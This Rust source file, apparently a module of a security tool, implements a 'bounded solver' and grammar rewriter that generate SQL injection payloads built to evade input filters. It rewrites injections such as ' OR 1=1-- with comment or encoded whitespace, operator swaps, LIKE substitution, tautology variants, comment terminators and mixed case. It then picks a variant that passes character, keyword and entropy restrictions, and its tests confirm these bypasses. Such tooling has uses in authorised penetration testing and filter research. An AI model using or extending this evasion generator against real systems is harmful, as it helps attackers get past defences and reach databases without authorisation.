//! Bounded constraint solver and grammar term rewriter for SQL injection synthesis.

use crate::constraint::ConstraintKind;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Calculates Shannon entropy of an ASCII/UTF-8 byte string.
/// H(X) = - \sum p(x) log2 p(x)
pub fn calculate_shannon_entropy(input: &str) -> f64 {
    if input.is_empty() {
        return 0.0;
    }
    let mut freq = HashMap::new();
    for ch in input.chars() {
        *freq.entry(ch).or_insert(0usize) += 1;
    }
    let total_chars = input.chars().count() as f64;
    let mut entropy = 0.0;
    for &count in freq.values() {
        let p = count as f64 / total_chars;
        entropy -= p * p.log2();
    }
    entropy
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SolverResult {
    pub is_satisfiable: bool,
    pub synthesized_value: Option<String>,
    pub explanation: String,
    pub entropy: f64,
}

/// Grammar-based term rewriter producing evasion-equivalent SQL expressions.
#[derive(Debug, Default, Clone)]
pub struct GrammarTermRewriter;

impl GrammarTermRewriter {
    /// Generates potential semantic-preserving evasion variants of a SQL fragment.
    pub fn rewrite_variants(&self, original: &str) -> Vec<String> {
        let mut variants = Vec::new();
        variants.push(original.to_string());

        // 1. Whitespace transformations
        if original.contains(' ') {
            variants.push(original.replace(' ', "/**/"));
            variants.push(original.replace(' ', "%20"));
            variants.push(original.replace(' ', "%09"));
            variants.push(original.replace(' ', "%0a"));
        }

        // 2. Operator substitutions (OR -> ||, AND -> &&)
        if original.to_uppercase().contains(" OR ") {
            let replaced = replace_word_case_insensitive(original, "OR", "||");
            variants.push(replaced.clone());
            if replaced.contains(' ') {
                variants.push(replaced.replace(' ', "/**/"));
            }
        }
        if original.to_uppercase().contains(" AND ") {
            let replaced = replace_word_case_insensitive(original, "AND", "&&");
            variants.push(replaced.clone());
            if replaced.contains(' ') {
                variants.push(replaced.replace(' ', "/**/"));
            }
        }

        // 3. Equality substitutions (= -> LIKE)
        if original.contains('=') {
            variants.push(original.replace('=', " LIKE "));
            variants.push(original.replace('=', "/**/LIKE/**/"));
        }

        // 4. Boolean tautology variations (1=1 -> 2-1=1, 2=2, 'a'='a')
        if original.contains("1=1") {
            variants.push(original.replace("1=1", "2-1=1"));
            variants.push(original.replace("1=1", "2=2"));
            variants.push(original.replace("1=1", "'a'='a'"));
            variants.push(original.replace("1=1", "(1)=(1)"));
        }

        // 5. Comment termination variations (-- -> #, -- -, /*)
        if original.ends_with("--") {
            let base = &original[..original.len() - 2];
            variants.push(format!("{}#", base));
            variants.push(format!("{}-- -", base));
            variants.push(format!("{}/*", base));
        }

        // 6. Keyword case-mixing
        if original.to_uppercase().contains("UNION") || original.to_uppercase().contains("SELECT") {
            variants.push(mix_case(original));
        }

        // Deduplicate while preserving insertion order
        let mut seen = std::collections::HashSet::new();
        variants.retain(|v| seen.insert(v.clone()));

        variants
    }
}

fn replace_word_case_insensitive(s: &str, target: &str, replacement: &str) -> String {
    let mut result = String::new();
    let mut i = 0;
    let bytes = s.as_bytes();
    let t_bytes = target.as_bytes();
    while i < bytes.len() {
        if i + t_bytes.len() <= bytes.len()
            && s[i..i + t_bytes.len()].eq_ignore_ascii_case(target)
        {
            result.push_str(replacement);
            i += t_bytes.len();
        } else {
            result.push(s[i..].chars().next().unwrap());
            i += s[i..].chars().next().unwrap().len_utf8();
        }
    }
    result
}

fn mix_case(s: &str) -> String {
    s.char_indices()
        .map(|(idx, ch)| {
            if idx % 2 == 0 {
                ch.to_ascii_uppercase()
            } else {
                ch.to_ascii_lowercase()
            }
        })
        .collect()
}

pub struct BoundedSmtSolver {
    pub timeout_ms: u64,
    pub default_max_entropy: Option<f64>,
    rewriter: GrammarTermRewriter,
}

impl Default for BoundedSmtSolver {
    fn default() -> Self {
        Self {
            timeout_ms: 50,
            default_max_entropy: Some(3.5),
            rewriter: GrammarTermRewriter,
        }
    }
}

impl BoundedSmtSolver {
    pub fn new(timeout_ms: u64, default_max_entropy: Option<f64>) -> Self {
        Self {
            timeout_ms,
            default_max_entropy,
            rewriter: GrammarTermRewriter,
        }
    }

    /// Evaluates candidate string against all constraints.
    pub fn validate_candidate(&self, candidate: &str, constraints: &[ConstraintKind]) -> Result<f64, String> {
        let entropy = calculate_shannon_entropy(candidate);

        for c in constraints {
            match c {
                ConstraintKind::StringLength { min_len, max_len } => {
                    if candidate.len() < *min_len || candidate.len() > *max_len {
                        return Err(format!(
                            "Candidate length {} outside [{}, {}]",
                            candidate.len(),
                            min_len,
                            max_len
                        ));
                    }
                }
                ConstraintKind::DisallowedCharacters { chars } => {
                    for ch in chars {
                        if candidate.contains(*ch) {
                            return Err(format!("Contains disallowed character '{}'", ch));
                        }
                    }
                }
                ConstraintKind::DisallowedKeywords { keywords } => {
                    let cand_upper = candidate.to_uppercase();
                    for kw in keywords {
                        if cand_upper.contains(&kw.to_uppercase()) {
                            return Err(format!("Contains disallowed keyword '{}'", kw));
                        }
                    }
                }
                ConstraintKind::MaxEntropy { max_entropy } => {
                    if entropy > *max_entropy {
                        return Err(format!(
                            "Entropy {:.3} exceeds maximum threshold {:.3}",
                            entropy, max_entropy
                        ));
                    }
                }
                ConstraintKind::IntegerRange { .. } => {}
                ConstraintKind::TypeBoundary { .. } => {}
            }
        }

        // Global default entropy check if specified and not overridden
        if let Some(max_ent) = self.default_max_entropy {
            let has_explicit_max = constraints.iter().any(|c| matches!(c, ConstraintKind::MaxEntropy { .. }));
            if !has_explicit_max && entropy > max_ent {
                return Err(format!(
                    "Entropy {:.3} exceeds default solver budget {:.3}",
                    entropy, max_ent
                ));
            }
        }

        Ok(entropy)
    }

    /// Solves for a valid SQL mutation respecting all constraints.
    /// If original candidate is valid, returns it. If invalid, applies GrammarTermRewriter
    /// to synthesize an evasion-compliant equivalent.
    pub fn solve(&self, constraints: &[ConstraintKind], candidate: &str) -> SolverResult {
        // First check original
        match self.validate_candidate(candidate, constraints) {
            Ok(entropy) => {
                return SolverResult {
                    is_satisfiable: true,
                    synthesized_value: Some(candidate.to_string()),
                    explanation: "Original candidate satisfies all bounded constraints".to_string(),
                    entropy,
                };
            }
            Err(first_err) => {
                // Try rewriting variants
                let variants = self.rewriter.rewrite_variants(candidate);
                let mut best_candidate = None;
                let mut min_entropy = f64::MAX;

                for variant in variants.iter().skip(1) {
                    if let Ok(ent) = self.validate_candidate(variant, constraints) {
                        if ent < min_entropy {
                            min_entropy = ent;
                            best_candidate = Some((variant.clone(), ent));
                        }
                    }
                }

                if let Some((rewritten, ent)) = best_candidate {
                    return SolverResult {
                        is_satisfiable: true,
                        synthesized_value: Some(rewritten),
                        explanation: "Satisfied via grammar term rewriting".to_string(),
                        entropy: ent,
                    };
                }

                SolverResult {
                    is_satisfiable: false,
                    synthesized_value: None,
                    explanation: format!("Constraints unsatisfiable: {}", first_err),
                    entropy: calculate_shannon_entropy(candidate),
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shannon_entropy() {
        assert_eq!(calculate_shannon_entropy(""), 0.0);
        assert_eq!(calculate_shannon_entropy("aaaa"), 0.0);
        let e = calculate_shannon_entropy("ab");
        assert!((e - 1.0).abs() < 1e-6);
    }

    #[test]
    fn test_smt_solver_direct_satisfiable() {
        let solver = BoundedSmtSolver::default();
        let constraints = vec![
            ConstraintKind::StringLength { min_len: 1, max_len: 30 },
            ConstraintKind::DisallowedCharacters { chars: vec![';'] },
        ];

        let res = solver.solve(&constraints, "' OR 1=1--");
        assert!(res.is_satisfiable);
        assert_eq!(res.synthesized_value.unwrap(), "' OR 1=1--");
    }

    #[test]
    fn test_smt_solver_evasion_rewrite_spaces() {
        let solver = BoundedSmtSolver::default();
        // Disallow space character ' '
        let constraints = vec![
            ConstraintKind::DisallowedCharacters { chars: vec![' '] },
        ];

        let res = solver.solve(&constraints, "' OR 1=1--");
        assert!(res.is_satisfiable);
        let synthesized = res.synthesized_value.unwrap();
        assert!(!synthesized.contains(' '));
        assert!(synthesized.contains("/**/"));
    }

    #[test]
    fn test_smt_solver_evasion_rewrite_keywords() {
        let solver = BoundedSmtSolver::default();
        // Disallow keyword "OR"
        let constraints = vec![
            ConstraintKind::DisallowedKeywords { keywords: vec!["OR".to_string()] },
        ];

        let res = solver.solve(&constraints, "' OR 1=1--");
        assert!(res.is_satisfiable);
        let synthesized = res.synthesized_value.unwrap();
        assert!(!synthesized.to_uppercase().contains("OR"));
        assert!(synthesized.contains("||"));
    }

    #[test]
    fn test_smt_solver_entropy_constraint() {
        let solver = BoundedSmtSolver::default();
        let constraints = vec![
            ConstraintKind::MaxEntropy { max_entropy: 1.5 },
        ];

        // "abcdefghijklmnop" has high entropy > 3.0
        let res = solver.solve(&constraints, "abcdefghijklmnop");
        assert!(!res.is_satisfiable);
    }
}
